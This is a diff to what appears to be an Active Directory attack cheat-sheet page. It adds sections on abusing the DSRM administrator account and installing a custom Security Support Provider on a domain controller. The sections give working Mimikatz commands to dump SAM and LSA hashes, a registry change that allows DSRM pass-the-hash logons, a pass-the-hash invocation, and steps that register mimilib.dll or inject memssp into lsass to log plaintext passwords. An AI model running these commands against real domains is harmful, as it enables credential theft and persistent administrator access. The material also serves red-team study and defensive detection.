@@ -506,7 +506,65 @@ mimikatz# !-
 
 <p>The DC can not be patched twice.</p>
 
-<h1 id="dsrm">DSRM</h1>
+<h1 id="directory-services-restore-mode-dsrm">Directory Services Restore Mode (DSRM)</h1>
+
+<p>There is a local administrator on every domain controlled called “Administrator” whose password is the DSRM password. DSRM password (SafeModePassword) is required when a server is promoted to Domain Controller and it is rarely changed.</p>
+
+<p>We only need to dump the DSRM password:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"token::elevate" "lsadump::sam"'</span> -ComputerName dc01
+</code></pre></div></div>
+
+<p>We can compare the Administrator hash with the Administrator hash with the following command:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"lsadump::lsa /patch"'</span> -ComputerName dc01
+</code></pre></div></div>
+<p>Since we have the NTLM hash, we can pass the hash to authenticate. But, the Logon Behaviour for the DSRM account needs to be changed before we can use its hash.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Enter-PSSession -ComputerName dc01
+<span class="nb">New-ItemProperty</span> <span class="s2">"HKLM:\System\CurrentControlSet\Control\Lsa\"</span> -Name <span class="s2">"DsrmAdminLogonBehaviour"</span> -Value 2 -PropertyType DWORD
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>Note</strong>: If we get an error such as <em>“New-ItemProperty: The property already exists”</em> you need to modify it.</p>
+
+  <p><code class="highlighter-rouge">Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"</code>
+<code class="highlighter-rouge">Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2</code></p>
+</blockquote>
+
+<ul>
+  <li>Over PassTheHash</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"sekurlsa::pth /domain:dc01 /user:Administrator /ntlm:a9b30e5b0dc865eadcea9411e4ade72d /run:powershell.exe'</span>
+<span class="nb">ls</span> \\dc01\c<span class="err">$</span>
+</code></pre></div></div>
+<h1 id="custom-security-support-provider-ssp">Custom Security Support Provider (SSP)</h1>
+
+<p>A security support provider is a dll which provides ways for an application to obtain an authenticated connection. Some SSP packages by microsoft are NTLM, kerberos, CredSSP…</p>
+
+<p>Mimikatz provides a custom SSP named <code class="highlighter-rouge">mimilib.dll</code>. This SSP logs everly local logon, service account and machine account in plain text on the target server.</p>
+
+<p>We can abuse in two different ways:</p>
+
+<ul>
+  <li>Dropping the <code class="highlighter-rouge">mimilib.dll</code> to <code class="highlighter-rouge">system32</code> and add mimilib to <code class="highlighter-rouge">HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code>:</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$packages</span> <span class="o">=</span> <span class="nb">Get-ItemProperty </span>HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name <span class="s1">'Security Packages'</span> | <span class="nb">select</span> -ExpandProperty <span class="s1">'Security Packages'</span>
+<span class="nv">$packages</span> +<span class="o">=</span> <span class="s2">"mimilib"</span>
+<span class="nb">Set-ItemProperty </span>HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name <span class="s1">'Security Packages'</span> -Value <span class="nv">$packages</span>
+<span class="nb">Set-ItemProperty </span>HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name <span class="s1">'Security Packages'</span> -Value <span class="nv">$packages</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Inject into lsass using mimikatz (not stable with Server 2016):</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"misc::memssp"'</span>
+</code></pre></div></div>
+
+<p>All local logons on the domain controller are logged to <code class="highlighter-rouge">C:\Windows\system32\kiwissp.log</code>.</p>
 
 			</article>
 		</section>
